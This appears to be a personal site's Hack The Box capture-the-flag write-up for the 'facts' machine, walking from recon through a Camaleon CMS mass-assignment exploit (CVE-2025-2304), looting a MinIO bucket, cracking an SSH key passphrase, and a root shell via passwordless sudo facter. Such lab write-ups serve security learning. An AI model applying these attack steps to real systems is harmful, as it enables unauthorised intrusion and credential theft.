@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>facts — Hack The Box</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚩</text></svg>">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="scanline" aria-hidden="true"></div>
+
+  <article class="writeup">
+    <a class="writeup-back" href="../index.html#ctf">back to writeups</a>
+
+    <h1>facts</h1>
+    <p class="writeup-meta">
+      Hack The Box &nbsp;·&nbsp; category: web / privesc &nbsp;·&nbsp; foothold → root
+    </p>
+
+    <h2>Recon</h2>
+    <p>I started with an Nmap service scan of the target.</p>
+    <pre><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
+|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
+80/tcp    open  http    nginx 1.26.3 (Ubuntu)
+54321/tcp open  http    MinIO (Golang net/http server)</code></pre>
+    <p>
+      The target had SSH on port 22, a web application on port 80, and an unknown
+      service on port 54321. Researching further, I confirmed port 54321 was running
+      <strong>MinIO</strong>, an S3-compatible object storage server.
+    </p>
+
+    <h2>Web enumeration</h2>
+    <p>
+      The web application appeared to be a content/blog platform. Nothing obvious on
+      the surface, so I ran a directory scan which revealed several endpoints:
+    </p>
+    <pre><code>/admin     (Status: 302) --&gt; /admin/login
+/search    (Status: 200)
+/post      (Status: 200)
+/error     (Status: 500)</code></pre>
+    <p>
+      The <code>/admin</code> redirect caught my attention first. After registering a
+      standard user account and exploring the dashboard, I noticed the CMS version was
+      leaked in the footer: <strong>Camaleon CMS 2.9.0</strong>, built on Ruby on Rails.
+    </p>
+    <p>I searched for known CVEs for that version and found a working proof-of-concept:</p>
+    <blockquote>
+      <strong>CVE-2025-2304</strong> — Mass assignment via <code>permit!</code>
+    </blockquote>
+
+    <h2>Foothold — CVE-2025-2304 (mass assignment)</h2>
+    <p>
+      Camaleon CMS 2.9.0 uses <code>permit!</code> in its Rails strong parameters
+      instead of an explicit allowlist. That means all user-supplied fields are accepted
+      without filtering — including sensitive ones like <code>role</code>. By injecting
+      <code>password[role]=admin</code> into a password-update request, a regular user
+      can escalate their own account to admin.
+    </p>
+    <pre><code>python3 exploit.py -u http://facts.htb/ -U Milo4 -P 1234 -e -r</code></pre>
+    <p>
+      This escalated my account to admin. Inside the admin panel, the S3 credentials for
+      the MinIO instance were exposed.
+    </p>
+
+    <h2>S3 enumeration</h2>
+    <p>Using the leaked credentials I enumerated the MinIO bucket via the AWS CLI:</p>
+    <pre><code>aws s3 ls --endpoint-url http://10.129.18.244:54321
+aws s3 sync s3://internal/ ./loot/ --endpoint-url http://10.129.18.244:54321</code></pre>
+    <p>Inside the bucket I found a <code>.ssh</code> directory containing two files:</p>
+    <pre><code>authorized_keys
+id_ed25519</code></pre>
+
+    <h2>Cracking the SSH key</h2>
+    <p>
+      The private key was passphrase-protected. I converted it to a crackable hash and
+      ran it against rockyou:
+    </p>
+    <pre><code>ssh2john id_ed25519 &gt; id_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_hash</code></pre>
+    <p>The passphrase cracked as: <code>dragonballz</code></p>
+
+    <h2>Finding the username</h2>
+    <p>
+      With the passphrase in hand, I extracted the public key from the private key to
+      reveal the username stored in the comment field:
+    </p>
+    <pre><code>ssh-keygen -y -f id_ed25519
+# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... trivia@facts.htb</code></pre>
+    <p>Username: <strong>trivia</strong></p>
+
+    <h2>SSH access</h2>
+    <pre><code>chmod 600 id_ed25519
+ssh -i id_ed25519 trivia@10.129.18.244</code></pre>
+    <p>I gained a shell and found the user flag in the <code>william</code> home directory.</p>
+    <pre><code>trivia@facts:~$ cat /home/william/user.txt
+<span class="flag">&lt;user-flag-here&gt;</span></code></pre>
+
+    <h2>Privilege escalation</h2>
+    <p>With the user flag in hand, I started enumerating privesc vectors, beginning with:</p>
+    <pre><code>sudo -l</code></pre>
+    <p>
+      This revealed that <code>facter</code> could be run as root by my user with no
+      password required.
+    </p>
+    <p>
+      Checking GTFOBins for <code>facter</code>, I found it can execute arbitrary Ruby
+      code via a custom facts directory passed with <code>--custom-dir</code>. The plan:
+      drop a malicious <code>.rb</code> file that spawns a shell.
+    </p>
+    <pre><code>mkdir -p /dev/dev/facts/
+echo 'exec "/bin/sh"' &gt; /dev/dev/facts/root.rb</code></pre>
+    <p>Then run <code>facter</code> as root, pointing it at the custom directory:</p>
+    <pre><code>sudo facter --custom-dir=/dev/dev/facts</code></pre>
+    <p>This spawned a root shell, and I obtained the root flag.</p>
+    <pre><code>root@facts:~# cat /root/root.txt
+<span class="flag">&lt;root-flag-here&gt;</span></code></pre>
+
+    <h2>Takeaways</h2>
+    <ul>
+      <li>A Rails app using <code>permit!</code> instead of an explicit allowlist is a mass-assignment waiting to happen — <code>role</code> should never be user-settable.</li>
+      <li>Object storage (MinIO/S3) reachable from an app is a common secret-leak vector; always enumerate buckets once you have credentials.</li>
+      <li>A single passwordless <code>sudo</code> binary (here <code>facter</code>) is enough for root — GTFOBins is the first place to check.</li>
+    </ul>
+  </article>
+
+  <footer class="site-footer">
+    <p><a href="../index.html">← home</a></p>
+  </footer>
+</body>
+</html>
